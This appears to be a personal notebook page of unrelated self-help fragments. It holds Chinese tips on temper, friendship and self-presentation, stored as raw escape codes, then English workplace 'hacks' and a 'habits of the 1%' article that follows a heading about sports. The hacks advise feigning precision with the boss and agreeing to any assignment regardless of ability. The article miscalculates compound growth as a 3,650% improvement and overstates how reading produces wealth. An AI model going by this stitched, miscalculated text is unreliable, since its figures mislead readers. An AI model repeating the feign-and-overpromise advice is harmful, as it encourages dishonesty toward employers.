\u6700\u540e\uff0c\u4f60\u7684\u8eab\u6750\uff0c\u4f60\u7684\u5916\u5f62\u662f\u4f60\u6700\u597d\u7684\u540d\u7247\u3002\u597d\u597d\u6253\u7406\u81ea\u5df1\u7684\u540d\u7247 \u4e3a\u4eba\u5904\u4e8b \u603c\u4eba \u9047\u5230\u8ba9\u81ea\u5df1\u4e0d\u723d\u7684\u4e8b\u60c5\uff0c\u60f3\u8981\u603c\u603c\u522b\u4eba\u7684\u65f6\u5019\uff0c\u5148\u628a\u81ea\u5df1\u8981\u8bf4\u7684\u8bdd\u5199\u4e0b\u6765\uff0c\u5c31\u5f53\u5bf9\u9762\u5c31\u662f\u90a3\u4e2a\u8ba9\u81ea\u5df1\u5f88\u4e0d\u723d\u7684\u4eba\u3002 \u5199\u597d\u540e\uff0c\u653e\u5728\u4e00\u8fb9\uff0c\u4e0d\u53d1\u51fa\u53bb\uff0c\u8ba9\u81ea\u5df1\u53bb\u505a\u5176\u4ed6\u7684\u4e8b\u60c5\u3002\u8fc7\u51e0\u4e2a\u5c0f\u65f6\u518d\u56de\u6765\uff0c\u8fd9\u65f6\u5019\uff0c\u4f60\u53ef\u80fd\u4f1a\u5947\u5999\u5730\u53d1\u73b0\uff0c\u81ea\u5df1\u7684\u6012\u6c14\u51cf\u5c11\u4e86\u5f88\u591a\uff0c\u518d\u53bb\u770b\u521a\u624d\u5199\u7684\u6587\u5b57\uff0c\u4f1a\u89c9\u5f97\u5f88\u591a\u4e0d\u59a5\u7684\u5730\u65b9\u3002 \u56e0\u4e3a\u4f60\u518d\u56de\u6765\u7684\u65f6\u5019\uff0c\u5df2\u7ecf\u6012\u6c14\u5168\u65e0\uff0c\u8fd8\u4f1a\u5e86\u5e78\u81ea\u5df1\u4e8f\u5f97\u6ca1\u6709\u53d1\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4e0d\u7136\u591a\u5e74\u7684\u60c5\u8c0a\u53ef\u80fd\u5c31\u6ca1\u4e86\u3002 \u5373\u4f7f\u5bf9\u65b9\u539f\u8c05\u4e86\u4f60\uff0c\u4f46\u662f\u7599\u7629\u5df2\u7ecf\u7ed3\u4e0b\u4e86\uff0c\u8981\u77e5\u9053\u51a4\u5bb6\u5b9c\u89e3\u4e0d\u5b9c\u7ed3\u554a\u3002 \u5173\u4e8e\u8212\u670d\u7684\u6c9f\u901a \u5982\u679c\u4e24\u4eba\u76f8\u5904\uff0c\u5bf9\u65b9\u8ba9\u4f60\u611f\u89c9\u5404\u65b9\u9762\u90fd\u5f88\u8212\u670d\uff0c\u5f88\u6709\u53ef\u80fd\u5bf9\u65b9\u5728\u667a\u5546\u548c\u60c5\u5546\u5404\u65b9\u9762\u90fd\u5728\u4f60\u4e4b\u4e0a\u3002 \u8fd9\u65f6\u5019\u9700\u8981\u63d0\u8d77\u7cbe\u795e\uff0c\u597d\u597d\u60f3\u60f3\u8be5\u5982\u4f55\u5b66\u4e60\u548c\u63d0\u9ad8\u3002 \u4e0d\u8981\u548c\u5c42\u6b21\u4e0d\u540c\u7684\u4eba\u4e89\u8fa9 \u90a3\u662f\u5bf9\u81ea\u5df1\u7684\u4e00\u79cd\u65e0\u76ca\u7684\u635f\u8017\u3002 \u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u8f6f\u5f31\u6216\u9000\u8ba9\uff0c\u800c\u662f\u5f53\u4f60\u8017\u5c3d\u4e86\u7cbe\u529b\uff0c\u5374\u96be\u4ee5\u6d88\u9664\u4eba\u4e0e\u4eba\u4e4b\u95f4\u7684\u8ba4\u77e5\u5dee\u8ddd\u3002 \u4f60\u4e0d\u53ef\u80fd\u7528\u8fa9\u8bba\u51fb\u8d25\u65e0\u77e5\u7684\u4eba\u3002 \u5bf9\u4e8e\u5c42\u6b21\u4e0d\u540c\u7684\u4eba\uff0c\u6211\u4eec\u4e0d\u5fc5\u523b\u610f\u76f8\u878d\uff0c\u4e5f\u4e0d\u5fc5\u8bd5\u56fe\u53bb\u6539\u53d8\u5bf9\u65b9\uff0c\u53ea\u9700\u5f85\u5728\u5404\u81ea\u7684\u5708\u5c42\u5185\uff0c\u7ed3\u4ea4\u4e00\u4e9b\u6c14\u5473\u76f8\u6295\u3001\u6709\u7740\u76f8\u540c\u4ef7\u503c\u89c2\u7684\u4eba\uff0c\u8fd9\u6837\u7684\u4eba\u751f\uff0c\u5b8c\u5168\u8db3\u77e3\u3002 \u8054\u7cfb\u8001\u670b\u53cb \u9694\u4e00\u6bb5\u65f6\u95f4\u548c\u597d\u4e45\u4e0d\u8054\u7cfb\u7684\u670b\u53cb\u95ee\u5019\u51e0\u53e5\u3002 \u6240\u4ee5\u517b\u6210\u4e86\u8fd9\u4e2a\u4e60\u60ef\uff0c\u4e3b\u52a8\u53bb\u95ee\u5019\u4e00\u4e0b\u670b\u53cb\u4eec\uff0c\u95ee\u95ee\u4ed6\u4eec\u6700\u8fd1\u600e\u4e48\u6837\u4e86\uff0c\u4e5f\u65b9\u4fbf\u4e0b\u6b21\u9700\u8981\u670b\u53cb\u5e2e\u5fd9\u7684\u65f6\u5019\uff0c\u663e\u5f97\u6ca1\u90a3\u4e48\u964c\u751f\u3002 \u5f53\u7136\u76ee\u7684\u4e5f\u4e0d\u80fd\u592a\u529f\u5229 Become interesting I think someone is boring only if they themselves think they are uninteresting. These people do not know how to frame things in the right way. Every aspect of life is a story. Scenario 1 Hey, good seeing you, it's been forever! How was your weekend? It was okay. What did you do? Nothing really. Same old. OR Scenario 2 Hey, good seeing you, it's been forever! How was your weekend? I did absolutely nothing. I managed to stay in bed for 40 out of 48 hours. Record! How'd you manage that... etc. etc. Don't think you aren't interesting. You are. Everyone is. Life is a story, and as long as you can tell it right, no one can disagree. Cool psychological hacks Stay relaxed at your mistakes. So that people do not take them too seriously. Say let me check that. Whenever you don't have an info/ update for boss's questions instead of staring at him blankly ; pretend to be precise. You may tell\u201d I\u2019ll check that\u201d with a serious sincerity. First draft should be simple. Let the boss exercise his passion to reject or correct. Your second draft will be accepted quickly. Self care reflects your self respect. Pay special attention to your personal hygeine, dressing, looks, body language and style. It reveals more than you tell. Never appear to be too perfect: \u201c(People don\u2019t care about those they can not identify with. Stop trying to prove yourself God\u2019s Gift to the organization.)\u201d Say less than required. \u201c( They will definitely ask for more if needed.)\u201d Show respect and care. This is the tried and tested way to win people\u2019s hearts. They love to be taken seriously. Make your work seem effortless. \u201c(Instead of showing how much you exert at work make your achievements seem effortless. Soon you will be rewarded with greater projects.)\u201d Boss is always right. Proving him wrong by any logic reflects you are smarter than him ; he will never forgive you for that. Of course there can be exceptions but generally they are like that. Attitude matters. Whether you can do it or not there is no harm in saying yes to any assignment. Reservations can be discussed later. Nobody needs a superman but everybody desires a sweet, humble and agreeable gentleman. \u751f\u6d3b\u54f2\u7406 \u5173\u4e8e\u4f53\u80b2

It\u2019s not a mystery or an enigma. It\u2019s a formula that anyone can follow. The only problem? It\u2019s REALLY F*&%$^G Hard! They Value Education Over Entertainment They value education and constant growth. They read every single day. They attend seminars. They hire coaches. If they watch television or play video games, they do so in a strategic manner designed to help them recharge, not to distract themselves from the tasks at hand. I\u2019ve never met someone who reads nonfiction books everyday for 30\u201360 minutes and isn\u2019t wealthy. (With the rare exception of individuals who read all day but never take action.) If you want to join the 1%, then this is where you start. Double down on your education. Learn about sales, marketing, psychology, high performance, productivity, business systems and finance. Put down the remote and pick up a book. It changed my life and it will change yours too. They Have a Plan and Stick to It One of the key habits that differentiates high performers (1%\u2019ers) from the rest of the population is that they are proactive instead of reactive. Every night, they write out what they accomplished that day and what their plan is for the following day. They have a clear list of priorities that they plan to accomplish. They wake up before they need to, spend a few minutes exercising, reading, journaling and meditating before going to work or building their business. When they start their day, they know exactly what needs to be done and why. They methodically move through their most valuable priorities, avoiding distractions like email, social media and water cooler talk. When the day ends, they\u2019ve accomplished at least one or two of their biggest priorities and they learn from their mistakes so that they can avoid making those mistakes the next day. Start by writing out a plan for the next 5 years of your life and figure out exactly what you want to accomplish. Based on that document, plan for every day the night before. Put your gym clothes, journal and books somewhere they are easy to access and move your alarm across the room so that you can\u2019t hit snooze. This simple shift will radically alter your days and put you in a state of proactivity vs. reactivity. They Invest Their Money In Themselves and Other Appreciating Assets Poor people spend money. Rich people invest. They simply invest their money into appreciating assets\u2026 Namely, themselves. 1%\u2019ers are notorious for spending lavishly on their own personal development and performance. They will spend thousands (sometimes millions) of dollars on advanced training, high performance coaching, books, seminars, and lectures. They invest in high quality supplements and a healthy diet that allows them to have high energy and enthusiasm throughout the day. If you want to join the 1% then you must stop spending your money on pointless crap that doesn\u2019t serve you. They Work On the Right Things Poor people work on whatever is in front of them; rich people work on what\u2019s most important to them. They don\u2019t work on the things that are easy. They work on the things that will get them results. They know the power of saying \u201cNo\u201d to things that don\u2019t serve their ultimate vision and they have laser focus on their #1 most important goal. They Lay One Brick a Day 1%\u2019ers operate by a philosophy known as \u201cKaizen\u201d which loosely translates to \u201cSmall daily improvement\u201d. They don\u2019t try to change everything all at once. They are patient. They lay one brick a day. They know that it\u2019s the tiny actions (not the grand leaps) that determine a person\u2019s destiny. They understand the power of the compound effect. 1% compounded over ten years is a 3,650% improvement. That\u2019s the difference between earning $100,000 a year and earning $3.6 million a year. Tap into this power and your life will change forever\u2026 IF you play the long game. They Play the Long Game 1%\u2019ers understand that life is a game played in years and decades, not months. They have goals for the next 30 and 90 days, yes. But they are more considerate of the next decade and how their actions today will impact them 10, 20, 30, and 40 years from now. They act with a sense of urgency, but they don\u2019t expect results to come quickly. They simply take small daily actions everyday knowing that one day, the results will compound and they will have the life of their dreams. They Value the Power of Networking 1%\u2019ers have allies. The 99% have friends. Rich people understand the value of networking and giving value to others with no expectation of anything in return. They intentionally build a network of people who are better than they are in their field. People who make them uncomfortable and insecure.
